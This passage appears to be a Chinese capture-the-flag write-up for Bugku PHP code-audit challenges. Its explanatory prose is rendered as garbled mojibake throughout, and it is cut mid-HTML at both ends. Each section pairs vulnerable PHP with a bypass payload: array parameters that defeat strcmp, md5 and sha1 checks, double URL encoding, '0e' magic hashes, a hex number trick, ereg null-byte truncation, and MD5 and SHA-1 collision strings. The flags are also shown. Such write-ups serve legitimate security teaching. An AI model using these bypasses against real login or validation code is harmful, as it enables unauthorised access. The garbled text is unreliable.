class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>å‡½æ•°è§£é‡Šï¼š</strong></p><p><strong>extract()å‡½æ•°</strong></p><p>ç”¨é€”ï¼šä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ï¼Œè¿”å›å€¼(intå‹)æ˜¯æˆåŠŸå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­çš„å˜é‡æ•°ç›®</p><p>ä»€ä¹ˆæ˜¯ç¬¦å·è¡¨ï¼Ÿ</p><p>ç¬¦å·è¡¨æ˜¯æŒ‡å½“å‰phpé¡µé¢ä¸­ï¼Œæ‰€æœ‰å˜é‡åç§°çš„é›†åˆ</p><p><strong>isset()å‡½æ•°</strong></p><p>ç”¨é€”ï¼šæ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®ï¼Œå¹¶ä¸”ä¸æ˜¯ NULL</p><p>æ³¨æ„ï¼š$_GETä¼ è¿‡æ¥çš„å‚æ•°çš„é”®å€¼ä¸ºstringç±»å‹</p><p><strong>file_get_contents()å‡½æ•°</strong></p><p>ç”¨é€”ï¼šfile_get_contents() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­<br>å¦‚æœå¤±è´¥ï¼Œfile_get_contents() å°†è¿”å› FALSE</p><p><strong>trim()å‡½æ•°</strong></p><p>ç”¨é€”ï¼šç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦</p><p><strong>è§£é¢˜æ€è·¯ï¼š</strong></p><p>é¦–å…ˆè¦GETä¼ ä¸€ä¸ªå‚æ•°shiyan</p><p>ç„¶åè¯»å–äº†$flagæ‰€ä»£è¡¨æ–‡ä»¶çš„å†…å®¹</p><pre><code>payload: ?shiyan=&amp;flag=1</code></pre><p>æ­¤æ—¶$shiyan=â€™â€™(ç©ºå­—ç¬¦ä¸²),è€Œä¸æ˜¯NULL,flagåªéœ€ä¼ é™¤å­˜åœ¨çš„æ–‡ä»¶åä»¥å¤–ä»»æ„å€¼,ç©ºå­—ç¬¦ä¸²å¼±ç­‰äºFALSE,è¾“å‡ºflag</p><pre><code>flag&#123;bugku-dmsj-p2sm3N&#125;</code></pre><h2 id="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"><a href="#strcmpæ¯”è¾ƒå­—ç¬¦ä¸²" class="headerlink" title="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"></a>strcmpæ¯”è¾ƒå­—ç¬¦ä¸²</h2><p>é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&#39;a&#39;])) &#123;</span><br><span class="line">    if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) </span><br><span class="line">    &#x2F;&#x2F;å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› &gt; 0ï¼Œå¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚</span><br><span class="line">    &#x2F;&#x2F;æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span><br><span class="line">    die(&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">    print &#39;No&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>åˆ†æä»£ç å¯çŸ¥éœ€è¦ä¼ é€’ä¸ªå‚æ•°a</p><p>æ¯”è¾ƒaå’Œ$flagçš„å€¼ï¼Œç›¸åŒå°±ä¼šè¾“å‡ºflagå¹¶ç»“æŸ</p><p>è¿™é‡Œå¯ä»¥ä¼ å…¥æ•°ç»„ï¼Œstrcmp()å‡½æ•°å½“æ¯”è¾ƒæ•°ç»„å’Œå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œè¿”å›æ˜¯NULLå³å¯ç»•è¿‡</p><pre><code>payloadï¼š?a[]=1flag&#123;bugku_dmsj_912k&#125;</code></pre><h2 id="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"></a>urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡</h2><p>é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">    echo(&quot;</span><br><span class="line"></span><br><span class="line">    not allowed!</span><br><span class="line"></span><br><span class="line">    &quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;</span><br><span class="line">    Access granted!</span><br><span class="line"></span><br><span class="line">    &quot;;</span><br><span class="line">    echo &quot;</span><br><span class="line">    flag</span><br><span class="line"></span><br><span class="line">    &quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>å‡½æ•°è§£é‡Šï¼š</strong></p><p><strong>eregi()å‡½æ•°</strong></p><pre><code>int eregi(string pattern, string string, [array regs]);</code></pre><p>eregi()å‡½æ•°åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æœç´¢æŒ‡å®šçš„æ¨¡å¼çš„å­—ç¬¦ä¸²ã€‚æœç´¢ä¸åŒºåˆ†å¤§å°å†™,å¦‚æœæ²¡æœ‰æ‰¾åˆ°åŒ¹é…æˆ–å‡ºé”™åˆ™è¿”å› FALSE</p><p>å¤„ç†æ•°ç»„å°†è¿”å›NULL</p><p><strong>urldecode()å‡½æ•°</strong></p><p>è§£ç ç»™å‡ºçš„å·²ç¼–ç å­—ç¬¦ä¸²ä¸­çš„ä»»ä½• %##ã€‚ åŠ å·ï¼ˆâ€™+â€™ï¼‰è¢«è§£ç æˆä¸€ä¸ªç©ºæ ¼å­—ç¬¦</p><p>åˆ†æä»£ç å¯çŸ¥ä¸èƒ½è®©eregi()å‡½æ•°æˆåŠŸåŒ¹é…ï¼Œè¦è®©<code>$_GET[id] == &quot;hackerDJ&quot;</code>æˆç«‹</p><p>phpåœ¨å¤„ç†ä¼ é€’è¿‡æ¥çš„å‚æ•°æ˜¯ä¼šè¿›è¡Œä¸€æ¬¡urlè§£ç </p><p>å¯ä»¥äºŒæ¬¡ç¼–ç è¿›è¡Œç»•è¿‡</p><pre><code>payload:?id=hackerD%254A</code></pre><p>%25æ˜¯%çš„urlç¼–ç ï¼Œ%4Aæ˜¯Jçš„urlç¼–ç </p><p>è¿™æ ·ç»è¿‡phpè§£æä¼šå¾—åˆ°</p><pre><code>?id=hackerD%4A</code></pre><p>å†æ¬¡ç»è¿‡å‡½æ•°è§£æä¼šå¾—åˆ°</p><pre><code>?id=hackerDJ</code></pre><h2 id="md5-å‡½æ•°"><a href="#md5-å‡½æ•°" class="headerlink" title="md5()å‡½æ•°"></a>md5()å‡½æ•°</h2><p>é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;]))</span><br><span class="line"> &#123; </span><br><span class="line">    if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;]) </span><br><span class="line">        print &#39;Your password can not be your username.&#39;;</span><br><span class="line">     else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;])) </span><br><span class="line">        die(&#39;Flag: &#39;.$flag); </span><br><span class="line">    else </span><br><span class="line">        print &#39;Invalid password&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>å‡½æ•°è§£é‡Šï¼š</strong></p><p><strong>md5()å‡½æ•°</strong></p><p>ç”¨é€”ï¼šä»¥ 32 å­—ç¬¦åå…­è¿›åˆ¶æ•°å­—å½¢å¼è¿”å›æ•£åˆ—å€¼</p><p>**ç»•è¿‡æ–¹æ³•:**md5()å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„</p><pre><code>payload:?password[]=1&amp;username[]=2</code></pre><p>md5()å‡½æ•°åœ¨å¤„ç†æ•°ç»„æ—¶ä¼šè¿”å›NULL</p><p><strong>md5ç¢°æ’</strong></p><p>ä¸¤ä¸ªMD5å€¼ç›¸åŒçš„ä¸åŒå­—ç¬¦ä¸²</p><pre><code>Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2å’ŒParam2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2`flag&#123;bugk1u-ad8-3dsa-2&#125;`</code></pre><h2 id="æ•°ç»„è¿”å›NULLç»•è¿‡"><a href="#æ•°ç»„è¿”å›NULLç»•è¿‡" class="headerlink" title="æ•°ç»„è¿”å›NULLç»•è¿‡"></a>æ•°ç»„è¿”å›NULLç»•è¿‡</h2><p>é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">echo &#39;You password must be alphanumeric&#39;;</span><br><span class="line">else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">die(&#39;Flag: &#39; . $flag);</span><br><span class="line">else</span><br><span class="line">echo &#39;Invalid password&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>å‡½æ•°è§£é‡Šï¼š</strong></p><p><strong>strpos()å‡½æ•°</strong></p><p>ç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</p><pre><code>int strpos( string $haystack, mixed $needle[, int $offset = 0] )</code></pre><p>å¦‚æœæ²¡æ‰¾åˆ° needleï¼Œå°†è¿”å› FALSE</p><p>å½“$haystackä¸ºæ•°ç»„æ—¶ï¼Œå‡½æ•°è¿”å›NULL,å½“$needleä¸ºæ•°ç»„æ—¶å‡½æ•°è¿”å›FALSE</p><pre><code>payload:?password[]=1</code></pre><p><code>ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;])</code>å’Œ<code>strpos ($_GET[&#39;password&#39;], &#39;--&#39;)</code>çš„è¿”å›ç»“æœéƒ½æ˜¯NULL,ä¸å¼ºç­‰äºFALSE</p><pre><code>flag&#123;ctf-bugku-ad-2131212&#125;</code></pre><h2 id="å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"><a href="#å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"></a>å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡</h2><p>é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</span><br><span class="line">if($temp&gt;1336)&#123;</span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure><p>åˆ†æé¢˜ç›®å¯çŸ¥GETä¼ å‚passwordï¼Œä¸”ä¸èƒ½ä¸ºçº¯æ•°å­—</p><pre><code>payload1:?password=2000a</code></pre><p>å­—ç¬¦ä¸²è¿›è¡Œæ•°å­¦è¿ç®—æ—¶ï¼Œä¼šè‡ªåŠ¨è½¬æ¢ä¸ºæ•°å­—åå†è¿›è¡Œè¿ç®—</p><pre><code>payload2:?password[]=1</code></pre><p>is_numeric()å‡½æ•°å¤„ç†æ•°ç»„æ—¶ä¼šè¿”å›FALSE</p><p>æ•°ç»„å¤§äºä»»ä¸€æ•°å­—</p><pre><code>flag&#123;bugku_null_numeric&#125;</code></pre><h2 id="sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡"><a href="#sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡"></a>sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡</h2><p>é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[&#39;name&#39;]);</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">var_dump($_GET[&#39;password&#39;]);</span><br><span class="line">var_dump(sha1($_GET[&#39;name&#39;]));</span><br><span class="line">var_dump(sha1($_GET[&#39;password&#39;]));</span><br><span class="line">if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class="line">echo &#39;</span><br><span class="line"></span><br><span class="line">Your password can not be your name!</span><br><span class="line"></span><br><span class="line">&#39;;</span><br><span class="line">else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))</span><br><span class="line">die(&#39;Flag: &#39;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &#39;</span><br><span class="line">Invalid password.</span><br><span class="line"></span><br><span class="line">&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">echo &#39;</span><br><span class="line">Login first!</span><br><span class="line"></span><br><span class="line">&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä¼ ä¸¤ä¸ªå‚æ•°ï¼Œnameå’Œpassword</p><p>å¹¶ä¸”è¿™ä¸¤ä¸ªå‚æ•°è¦ç»è¿‡sha1()åŠ å¯†è¿˜è¦ç›¸ç­‰æ‰èƒ½è¾“å‡ºflag</p><p>è¿™é‡Œä¾¿æƒ³åˆ°äº†ä¼ å…¥æ•°ç»„å°†è¿”å›NULL</p><pre><code>payload1:?name[]=1&amp;password[]=2</code></pre><p>sha1()ç¢°æ’</p><pre><code>payload2:?name=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></pre><p>å¥½åƒç›´æ¥æ˜¾ç¤ºä¸å‡ºæ¥ï¼Œéœ€è¦æŸ¥çœ‹æºä»£ç æˆ–è€…æŠ“åŒ…</p><pre><code>flag&#123;bugku--daimasj-a2&#125;</code></pre><h2 id="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"><a href="#md5åŠ å¯†ç›¸ç­‰ç»•è¿‡" class="headerlink" title="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"></a>md5åŠ å¯†ç›¸ç­‰ç»•è¿‡</h2><p>é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$md51 &#x3D; md5(&#39;QNKCDZO&#39;);</span><br><span class="line">$a &#x3D; @$_GET[&#39;a&#39;];</span><br><span class="line">$md52 &#x3D; @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;</span><br><span class="line">echo &quot;flag&#123;*&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°<code>QNKCDZO</code>ç«‹é©¬æƒ³åˆ°äº†md5å¼±æ¯”è¾ƒ</p><p>å³phpä¼šæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0</p><pre><code>payload:?a=s878926199a</code></pre><p>å…¶ä¸­<code>QNKCDZO</code>å’Œ<code>s878926199a</code> md5åŠ å¯†åéƒ½æ˜¯0eå¼€å¤´</p><pre><code>flag&#123;bugku-dmsj-am9ls&#125;</code></pre><h2 id="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"><a href="#åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ" class="headerlink" title="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"></a>åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ</h2><p>é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">$one &#x3D; ord(&#39;1&#39;); &#x2F;&#x2F;ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span><br><span class="line">$nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span><br><span class="line">$number &#x3D; &#39;3735929054&#39;;</span><br><span class="line">&#x2F;&#x2F; Check all the input characters!</span><br><span class="line">for ($i &#x3D; 0; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; Disallow all the digits!</span><br><span class="line">$digit &#x3D; ord($temp&#123;$i&#125;);</span><br><span class="line">if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; Aha, digit not allowed!</span><br><span class="line">return &quot;flase&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if($number &#x3D;&#x3D; $temp)</span><br><span class="line">return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºflagçš„æ¡ä»¶$tempè¦å¼±ç­‰äº<code>$number = â€˜3735929054â€™</code>ï¼Œ$tempä¸ºä¼ å…¥å‚æ•°passwordçš„å€¼ï¼Œå¹¶ä¸”éå†$tempçš„æ¯ä¸ªå­—ç¬¦è¿˜ä¸èƒ½åœ¨1â€”-9ä¹‹é—´</p><p>çœ‹ç€é¢˜ç›®åç§°ä¾¿æƒ³åˆ°äº†è½¬æ¢16è¿›åˆ¶</p><pre><code>payload:?password=0xdeadc0de</code></pre><p>0xdeadc0deä¸º3735929054åå…­è¿›åˆ¶å½¢å¼</p><pre><code>flag&#123;Bugku-admin-ctfdaimash&#125;</code></pre><h2 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h2><h2 id="eregæ­£åˆ™-00æˆªæ–­"><a href="#eregæ­£åˆ™-00æˆªæ–­" class="headerlink" title="eregæ­£åˆ™%00æˆªæ–­"></a>eregæ­£åˆ™%00æˆªæ–­</h2><p>é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;xxx&quot;;</span><br><span class="line">if (isset ($_GET[&#39;password&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">    echo &#39;</span><br><span class="line"></span><br><span class="line">    You password must be alphanumeric</span><br><span class="line"></span><br><span class="line">    &#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)</span><br><span class="line">    &#123;</span><br><span class="line">        if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !&#x3D;&#x3D; FALSE) &#x2F;&#x2F;strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</span><br><span class="line">        &#123;</span><br><span class="line">        die(&#39;Flag: &#39; . $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">        echo(&#39;</span><br><span class="line">        - have not been found</span><br><span class="line"></span><br><span class="line">        &#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">    echo &#39;</span><br><span class="line">    Invalid password</span><br><span class="line"></span><br><span class="line">    &#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>eregå‡½æ•°å­˜åœ¨00æˆªæ–­æ¼æ´ï¼Œå½“eregè¯»å–å­—ç¬¦ä¸²stringæ—¶,å¦‚æœé‡åˆ°äº†%00,åé¢çš„å­—ç¬¦ä¸²å°±ä¸ä¼šè¢«è§£æ</p><pre><code>payload: ?password=1e9%00*-*</code></pre><p>1e9æ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä»£è¡¨1x10^9</p><p>åˆ©ç”¨ereg()å‡½æ•°00æˆªæ–­æ¼æ´ï¼Œç»•è¿‡åŒ¹é…</p><p>*-*ï¼Œåº”è¯¥æ˜¯é¢˜ç›®å‡ºé”™äº†ï¼Œä¸è¿‡æç¤ºé‡Œæœ‰</p><p>å¦å¤–ä¹Ÿå¯ä»¥ç›´æ¥ä¼ æ•°ç»„</p><pre><code>payload: ?password[]=1flag&#123;bugku-dm-sj-a12JH8&#125;</code></pre><h2 id="strposæ•°ç»„ç»•è¿‡"><a href="#strposæ•°ç»„ç»•è¿‡" class="headerlink" title="strposæ•°ç»„ç»•è¿‡"></a>strposæ•°ç»„ç»•è¿‡</h2><p>é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 